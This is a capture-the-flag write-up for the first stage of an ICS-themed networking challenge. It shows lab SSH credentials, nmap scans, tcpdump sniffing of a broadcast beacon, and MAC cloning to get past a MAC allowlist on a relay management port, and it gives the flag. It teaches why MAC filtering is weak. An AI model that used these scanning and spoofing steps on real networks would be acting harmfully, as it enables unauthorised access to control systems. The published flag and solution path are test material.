# The Spine 1/5 — Patch In ("Get onto the management port")

**Flag:** `reentry{cl0n3d_4_mac_p4st_th3_4dm1ss10n_l1st}`

| | |
|---|---|
| Category | Networking / L2 (ICS bus, MAC allowlist) |
| Entry | `ssh eng@tcp.reentry.lol -p 30081` (password `halley`) |
| Bus | `10.185.1.0/24` (instrument segment) |
| Goal | Reach the relay management port (`10.185.1.2 tcp/9601`) |
| Trick | The relay only lets one MAC address past, and it broadcasts that MAC on the bus itself |

> **Challenge brief:** The trunk is live and your laptop is on it, but the relay's
> management port turns you away — and tells you your own hardware address while doing it,
> which is more than it meant to say. It also announces, to anyone on the segment who cares
> to listen, which console it is willing to talk to. Get onto the management port.

Two hints = two leaks:
1. The "denied" message **gives you your own MAC** (so the filter is on the source MAC).
2. The relay **broadcasts** which MAC is authorized.

---

## 1. Get a shell on the service laptop

Port `30081` is SSH with password auth. There is no `sshpass`, so pass the password with
`pexpect`:

```bash
python3 -m venv .venv && source .venv/bin/activate && pip install pexpect
```

```python
# ssh_run.py
import sys, pexpect
child = pexpect.spawn(
    "ssh -p 30081 -o StrictHostKeyChecking=no -o PreferredAuthentications=password "
    "-o PubkeyAuthentication=no eng@tcp.reentry.lol " + "'" + sys.argv[1] + "'",
    timeout=60, encoding='utf-8')
child.expect('[Pp]assword:'); child.sendline('halley'); child.expect(pexpect.EOF)
print(child.before)
```

```bash
python3 ssh_run.py 'id; ip -br a; cat /etc/motd'
```

What we learn:
- We are `eng` in a container, with **passwordless sudo** on this box.
- `eth0 = 10.185.1.4/24`.
- The instrument segment is `10.185.1.0/24`.

---

## 2. Find the relay and its management port

```bash
python3 ssh_run.py 'nmap -sn 10.185.1.0/24 | grep report'
python3 ssh_run.py 'nmap -p1-65535 --open 10.185.1.2 | grep /tcp'
# 9601/tcp open
```

Relay = `10.185.1.2`, management port = `tcp/9601`.

---

## 3. Leak #1 — the port returns our own MAC

First set the **native** interface MAC (what a "clean" player starts with) so we can see the
refusal. The Docker MAC scheme is `02:42:<ip-in-hex>`; for `10.185.1.4` that is
`02:42:0a:b9:01:04`.

```bash
python3 ssh_run.py 'sudo ip link set eth0 down; \
  sudo ip link set eth0 address 02:42:0a:b9:01:04; \
  sudo ip link set eth0 up'
```

Connect to the management port (the relay sends a banner right after `connect`):

```bash
python3 ssh_run.py "python3 -c \"import socket;s=socket.socket();s.connect(('10.185.1.2',9601));print(s.recv(4096).decode())\""
```

```
RELAY-GW MANAGEMENT
admission denied: this port is restricted to the authorised console
your hardware address: 02:42:0a:b9:01:04
```

So the port **filters on the source MAC** and hands us our own address. We only need one more
thing: *which* MAC it expects.

---

## 4. Leak #2 — the relay broadcasts the authorized console

Listen on the bus. The relay (`10.185.1.2`) sends a UDP broadcast to `10.185.1.255:9602`
about every 3 seconds:

```bash
python3 ssh_run.py 'sudo timeout 12 tcpdump -i eth0 -nn -e -X "udp port 9602"'
```

The packet ("MRDN-ADMISSION" beacon) decodes to:

```
MRDN-ADMISSION relay=RELAY-GW mgmt-port=9601 authorised-console=02:4d:52:71:68:0d policy=mac-allowlist
```

> **Authorized MAC = `02:4d:52:71:68:0d`**, policy = `mac-allowlist`.

Quick one-liner to pull just the MAC:

```bash
python3 ssh_run.py 'sudo timeout 6 tcpdump -i eth0 -nn -A "udp port 9602" 2>/dev/null | grep -o "authorised-console=[0-9a-f:]*" | head -1'
# authorised-console=02:4d:52:71:68:0d
```

---

## 5. Clone the MAC and enter the management port

```bash
python3 ssh_run.py 'sudo ip link set eth0 down; \
  sudo ip link set eth0 address 02:4d:52:71:68:0d; \
  sudo ip link set eth0 up; \
  ip -o link show eth0 | grep -o "ether [0-9a-f:]*"'
# ether 02:4d:52:71:68:0d
```

Reconnect to `tcp/9601`:

```bash
python3 ssh_run.py "python3 -c \"import socket;s=socket.socket();s.connect(('10.185.1.2',9601));print(s.recv(4096).decode())\""
```

```
RELAY-GW MANAGEMENT :: authorised console

reentry{cl0n3d_4_mac_p4st_th3_4dm1ss10n_l1st}

segment map:
  controller   lazarus-bc (bus udp/9600)
  relay        this node (bus udp/9600, mgmt tcp/9601)
  terminals    RT-1 THERMAL, RT-7 AIRLOCK, RT-9 ATTITUDE
  assembler    10.185.0.0/24 (beyond the core router)

firmware image: GET /firmware (this port, send the literal line)
```

> ## 🏁 Flag: `reentry{cl0n3d_4_mac_p4st_th3_4dm1ss10n_l1st}`

The banner also shows the way into stage 2/5: `GET /firmware`.

---

## 6. TL;DR — command by command

```bash
# shell
ssh eng@tcp.reentry.lol -p 30081            # password: halley

# find the relay + management port
nmap -sn 10.185.1.0/24
nmap -p1-65535 --open 10.185.1.2            # 9601/tcp

# leak 1: the refusal returns our MAC
sudo ip link set eth0 down
sudo ip link set eth0 address 02:42:0a:b9:01:04     # native MAC
sudo ip link set eth0 up
python3 -c "import socket;s=socket.socket();s.connect(('10.185.1.2',9601));print(s.recv(4096).decode())"
#   admission denied ... your hardware address: 02:42:0a:b9:01:04

# leak 2: the relay broadcasts the authorized MAC (udp/9602 broadcast every ~3s)
sudo tcpdump -i eth0 -nn -A 'udp port 9602' | grep -o 'authorised-console=[0-9a-f:]*'
#   authorised-console=02:4d:52:71:68:0d

# clone MAC -> enter management port -> FLAG
sudo ip link set eth0 down
sudo ip link set eth0 address 02:4d:52:71:68:0d
sudo ip link set eth0 up
python3 -c "import socket;s=socket.socket();s.connect(('10.185.1.2',9601));print(s.recv(4096).decode())"
```

---

## 7. Why it works

The management port is protected by a **MAC address allowlist** (Layer 2) with no
cryptographic authentication. That control is worthless because:

1. The refusal **reveals** the scheme (it filters on source MAC and shows you yours).
2. The relay **broadcasts** the authorized MAC in an open beacon to the whole bus.
3. A MAC can be **cloned** freely (`ip link set eth0 address …`).

Hence the flag: *cloned a MAC past the admission list*.

> **Next stage:** [2 - Relay Firmware](2%20-%20Relay%20Firmware.md)
> (`GET /firmware` on port 9601 → reverse the MRDN frame and its CRC-16).
